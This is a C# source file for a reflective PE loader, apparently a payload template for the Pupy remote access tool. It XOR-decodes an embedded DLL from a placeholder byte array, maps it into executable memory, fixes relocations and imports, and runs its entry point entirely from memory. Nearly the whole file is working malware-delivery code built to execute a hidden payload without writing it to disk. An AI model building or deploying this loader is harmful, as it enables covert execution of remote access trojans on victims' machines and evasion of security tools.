/*
Original Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Edited by @n1nj4sec

*/

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace PELoader
{
    unsafe class Program
    {
        private const int MAX_RECORDS = 1000;
        private const byte MASK_BYTE = 0xFF;

        public enum DllReason : uint
        {
            DLL_PROCESS_ATTACH = 1,
            DLL_THREAD_ATTACH = 2,
            DLL_THREAD_DETACH = 3,
            DLL_PROCESS_DETACH = 0
        }

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool DllEntryDelegate(void* hinstDLL, DllReason fdwReason, void* lpReserved);

        private static PELoader Unpack(string[] args)
        {
            /* Do nothing about args for now */

            byte[] RawPE = <PUPYx64_BYTES>;
            for (int i = 0; i < RawPE.Length; i++)
            {
                RawPE[i] ^= MASK_BYTE;
            }

            return new PELoader(RawPE);
        }

        public static void Main()
        {
            ExecutePELoader(new string[] { });
        }

        private static void ExecutePELoader(string[] args)
        {
            PELoader pe = Unpack(args);

            DllEntryDelegate _dllEntry;

            uint SizeOfImage;
            ulong ImageBase;
            IntPtr CodeBase;
            IntPtr RelocationTable;
            IntPtr ImportTableVirtualAddress;
            uint ImportTableVirtualAddressOffset;
            uint AddressOfEntryPoint;

            if (pe.Is32BitHeader)
            {
                SizeOfImage = pe.OptionalHeader32.SizeOfImage;
                ImageBase = pe.OptionalHeader32.ImageBase;
                AddressOfEntryPoint = pe.OptionalHeader32.AddressOfEntryPoint;
                ImportTableVirtualAddressOffset = pe.OptionalHeader32.ImportTable.VirtualAddress;
            }
            else {
                SizeOfImage = pe.OptionalHeader64.SizeOfImage;
                ImageBase = pe.OptionalHeader64.ImageBase;
                AddressOfEntryPoint = pe.OptionalHeader64.AddressOfEntryPoint;
                ImportTableVirtualAddressOffset = pe.OptionalHeader64.ImportTable.VirtualAddress;
            }

            Console.WriteLine("Preferred Load Address = {0:X16}", ImageBase);

            CodeBase = NativeDeclarations.VirtualAlloc(
                IntPtr.Zero, SizeOfImage,
                NativeDeclarations.MEM_COMMIT,
                NativeDeclarations.PAGE_EXECUTE_READWRITE);

            Console.WriteLine(
                "Allocated Space For {0:X16} at {1:X16}",
                SizeOfImage, CodeBase);

            //Copy Sections
            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {
                IntPtr SectionVirtualAddress = (IntPtr)((byte*)CodeBase + pe.ImageSectionHeaders[i].VirtualAddress);
                IntPtr MappedVirtualAddress = NativeDeclarations.VirtualAlloc(
                    SectionVirtualAddress,
                    pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT,
                    NativeDeclarations.PAGE_EXECUTE_READWRITE
                );

                Marshal.Copy(
                    pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData,
                    MappedVirtualAddress, (int)pe.ImageSectionHeaders[i].SizeOfRawData);

                Console.WriteLine("Section {0}, Copied To {1:X16}", pe.ImageSectionHeaders[i].Name, MappedVirtualAddress);
            }

            //Perform Base Relocation
            long delta;

            if (pe.Is32BitHeader) {
                int currentbase = CodeBase.ToInt32();
                delta = currentbase - (int)ImageBase;
                RelocationTable = (IntPtr)((byte*)CodeBase + pe.OptionalHeader32.BaseRelocationTable.VirtualAddress);
            } else {
                long currentbase = CodeBase.ToInt64();
                delta = currentbase - (long)ImageBase;
                RelocationTable = (IntPtr)((byte*)CodeBase + pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
            }

            if (delta >= 0) {
                Console.WriteLine("Delta = {0:X16}", delta);
            } else {
                Console.WriteLine("Delta = -{0:X16}", -delta);
            }

            NativeDeclarations.IMAGE_BASE_RELOCATION RelocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();

            RelocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(
                RelocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = RelocationTable;
            int sizeofNextBlock = (int)RelocationEntry.SizeOfBlock;
            IntPtr offset = RelocationTable;

            while (true)
            {
                NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                IntPtr x = (IntPtr)((byte*)RelocationTable + sizeofNextBlock);
                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(
                    x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                IntPtr dest = (IntPtr)((byte*)CodeBase + (int)RelocationEntry.VirtualAdress);

                for (int i = 0; i < (int)((RelocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {
                    IntPtr patchAddr;

                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));
                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);

                    long originalAddr;
                    long fixedAddr;

                    patchAddr = (IntPtr)((byte*)dest + fixup);

                    switch (type)
                    {
                        case 0x0:
                            Console.WriteLine("[R] ABS");
                            break;

                        case 0x3:
                            originalAddr = (long) Marshal.ReadInt32(patchAddr);
                            fixedAddr = originalAddr + delta;

                            Console.WriteLine(
                                "[R] {0:X8} (+ {1}) -> {2:X8}", 
                                originalAddr, delta, fixedAddr);
                            Marshal.WriteInt32(patchAddr, (int) fixedAddr);
                            break;

                        case 0xA: 
                            originalAddr = Marshal.ReadInt64(patchAddr);
                            fixedAddr = originalAddr + delta;
                            Console.WriteLine(
                                "[R] {0:X16} (+ {1}) -> {2:X16}", 
                                    originalAddr, delta, fixedAddr);
                            Marshal.WriteInt64(patchAddr, fixedAddr);
                            break;

                        default:
                            Console.WriteLine("[R] Invalid relocation: {0}", type);
                            break;
                    }
                }

                offset = (IntPtr)((byte*)RelocationTable + sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                RelocationEntry = relocationNextEntry;

                nextEntry = (IntPtr)((byte*)nextEntry + sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0)
                    break;
            }

            ImportTableVirtualAddress = (IntPtr)((byte*)CodeBase + ImportTableVirtualAddressOffset);

            int oa2 = Marshal.ReadInt32((IntPtr)((byte*)ImportTableVirtualAddress + 16));

            //Get And Display Each DLL To Load
            for (int j = 0; j < MAX_RECORDS; j++) //HardCoded Number of DLL's Do this Dynamically.
            {
                IntPtr a1 = (IntPtr)((byte*)CodeBase + (20 * j) + ImportTableVirtualAddressOffset);

                int entryLength = Marshal.ReadInt32((IntPtr)((byte*)a1 + 16));

                //Need just last part?
                IntPtr DllFuncNameIdx = (IntPtr)((byte*)CodeBase + pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));

                IntPtr dllNamePTR = (IntPtr)((byte*)CodeBase + Marshal.ReadInt32((IntPtr)((byte*)(a1) + 12)));
                string DllName = Marshal.PtrToStringAnsi(dllNamePTR);

                Console.WriteLine("Import DLL {0}", DllName);

                if (DllName == "")
                    break;

                IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                Console.WriteLine("Loaded {0} -> {1}", DllName, handle);
                for (int k = 1; k < MAX_RECORDS; k++)
                {
                    IntPtr DllFuncNamePtr = ((IntPtr)((byte*)CodeBase + Marshal.ReadInt32(DllFuncNameIdx)));
                    string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((byte*)DllFuncNamePtr + 2));

                    IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);

                    Console.WriteLine("Import Function {0} -> {1:X16}", DllFuncName, funcAddy);

                    if (pe.Is32BitHeader) {
                        Marshal.WriteInt32(DllFuncNameIdx, (int)funcAddy);
                        DllFuncNameIdx = (IntPtr)((byte*)DllFuncNameIdx + 4);
                    } else {
                        Marshal.WriteInt64(DllFuncNameIdx, (long)funcAddy);
                        DllFuncNameIdx = (IntPtr)((byte*)DllFuncNameIdx + 8);
                    }

                    if (DllFuncName == "")
                        break;
                }
            }

            IntPtr OEP = (IntPtr)((byte*)CodeBase + AddressOfEntryPoint);

            //Transfer Control To OEP
            Console.WriteLine("Executing DLL [OEP -> {0:X16}]", OEP);

            _dllEntry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(OEP, typeof(DllEntryDelegate));

            if (_dllEntry == null || !_dllEntry((byte*)CodeBase, DllReason.DLL_PROCESS_ATTACH, null))
            {
                throw new Exception("Can't attach DLL to process.");
            }
        }
    }

    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeReg = 0x00000000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeDsect = 0x00000001,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeNoLoad = 0x00000002,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeGroup = 0x00000004,
            /// <summary>
            /// The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES. This is valid only for object files.
            /// </summary>
            TypeNoPadded = 0x00000008,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeCopy = 0x00000010,
            /// <summary>
            /// The section contains executable code.
            /// </summary>
            ContentCode = 0x00000020,
            /// <summary>
            /// The section contains initialized data.
            /// </summary>
            ContentInitializedData = 0x00000040,
            /// <summary>
            /// The section contains uninitialized data.
            /// </summary>
            ContentUninitializedData = 0x00000080,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            LinkOther = 0x00000100,
            /// <summary>
            /// The section contains comments or other information. The .drectve section has this type. This is valid for object files only.
            /// </summary>
            LinkInfo = 0x00000200,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeOver = 0x00000400,
            /// <summary>
            /// The section will not become part of the image. This is valid only for object files.
            /// </summary>
            LinkRemove = 0x00000800,
            /// <summary>
            /// The section contains COMDAT data. For more information, see section 5.5.6, COMDAT Sections (Object Only). This is valid only for object files.
            /// </summary>
            LinkComDat = 0x00001000,
            /// <summary>
            /// Reset speculative exceptions handling bits in the TLB entries for this section.
            /// </summary>
            NoDeferSpecExceptions = 0x00004000,
            /// <summary>
            /// The section contains data referenced through the global pointer (GP).
            /// </summary>
            RelativeGP = 0x00008000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemPurgeable = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            Memory16Bit = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryLocked = 0x00040000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryPreload = 0x00080000,
            /// <summary>
            /// Align data on a 1-byte boundary. Valid only for object files.
            /// </summary>
            Align1Bytes = 0x00100000,
            /// <summary>
            /// Align data on a 2-byte boundary. Valid only for object files.
            /// </summary>
            Align2Bytes = 0x00200000,
            /// <summary>
            /// Align data on a 4-byte boundary. Valid only for object files.
            /// </summary>
            Align4Bytes = 0x00300000,
            /// <summary>
            /// Align data on an 8-byte boundary. Valid only for object files.
            /// </summary>
            Align8Bytes = 0x00400000,
            /// <summary>
            /// Align data on a 16-byte boundary. Valid only for object files.
            /// </summary>
            Align16Bytes = 0x00500000,
            /// <summary>
            /// Align data on a 32-byte boundary. Valid only for object files.
            /// </summary>
            Align32Bytes = 0x00600000,
            /// <summary>
            /// Align data on a 64-byte boundary. Valid only for object files.
            /// </summary>
            Align64Bytes = 0x00700000,
            /// <summary>
            /// Align data on a 128-byte boundary. Valid only for object files.
            /// </summary>
            Align128Bytes = 0x00800000,
            /// <summary>
            /// Align data on a 256-byte boundary. Valid only for object files.
            /// </summary>
            Align256Bytes = 0x00900000,
            /// <summary>
            /// Align data on a 512-byte boundary. Valid only for object files.
            /// </summary>
            Align512Bytes = 0x00A00000,
            /// <summary>
            /// Align data on a 1024-byte boundary. Valid only for object files.
            /// </summary>
            Align1024Bytes = 0x00B00000,
            /// <summary>
            /// Align data on a 2048-byte boundary. Valid only for object files.
            /// </summary>
            Align2048Bytes = 0x00C00000,
            /// <summary>
            /// Align data on a 4096-byte boundary. Valid only for object files.
            /// </summary>
            Align4096Bytes = 0x00D00000,
            /// <summary>
            /// Align data on an 8192-byte boundary. Valid only for object files.
            /// </summary>
            Align8192Bytes = 0x00E00000,
            /// <summary>
            /// The section contains extended relocations.
            /// </summary>
            LinkExtendedRelocationOverflow = 0x01000000,
            /// <summary>
            /// The section can be discarded as needed.
            /// </summary>
            MemoryDiscardable = 0x02000000,
            /// <summary>
            /// The section cannot be cached.
            /// </summary>
            MemoryNotCached = 0x04000000,
            /// <summary>
            /// The section is not pageable.
            /// </summary>
            MemoryNotPaged = 0x08000000,
            /// <summary>
            /// The section can be shared in memory.
            /// </summary>
            MemoryShared = 0x10000000,
            /// <summary>
            /// The section can be executed as code.
            /// </summary>
            MemoryExecute = 0x20000000,
            /// <summary>
            /// The section can be read.
            /// </summary>
            MemoryRead = 0x40000000,
            /// <summary>
            /// The section can be written to.
            /// </summary>
            MemoryWrite = 0x80000000
        }

        /// <summary>
        /// The DOS header
        /// </summary>
        private IMAGE_DOS_HEADER dosHeader;
        /// <summary>
        /// The file header
        /// </summary>
        private IMAGE_FILE_HEADER fileHeader;
        /// <summary>
        /// Optional 32 bit file header
        /// </summary>
        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
        /// <summary>
        /// Optional 64 bit file header
        /// </summary>
        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
        /// <summary>
        /// Image Section headers. Number of sections is in the file header.
        /// </summary>
        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        private byte[] rawbytes;

        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                rawbytes = fileBytes;
            }
        }

        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }

        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }

        /// <summary>
        /// Gets the optional header
        /// </summary>
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }

        /// <summary>
        /// Gets the optional header
        /// </summary>
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes
        {
            get
            {
                return rawbytes;
            }
        }
    }

    unsafe class NativeDeclarations
    {

        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }
    }
}